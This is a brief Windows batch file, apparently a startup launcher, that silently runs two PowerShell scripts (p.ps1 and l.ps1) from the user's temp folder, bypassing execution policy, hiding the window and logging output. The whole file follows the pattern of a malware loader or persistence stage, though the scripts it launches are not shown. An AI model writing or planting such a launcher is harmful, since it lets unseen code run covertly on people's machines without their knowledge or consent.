@echo off
REM Redirect output to a log file
set LOGFILE="%TEMP%\startup_log.txt"

IF EXIST "%TEMP%\p.ps1" (
    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\p.ps1" >> %LOGFILE% 2>&1
) ELSE (
    echo "p.ps1 not found in %TEMP%" >> %LOGFILE%
)

IF EXIST "%TEMP%\l.ps1" (
    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\l.ps1" >> %LOGFILE% 2>&1
) ELSE (
    echo "l.ps1 not found in %TEMP%" >> %LOGFILE%
)
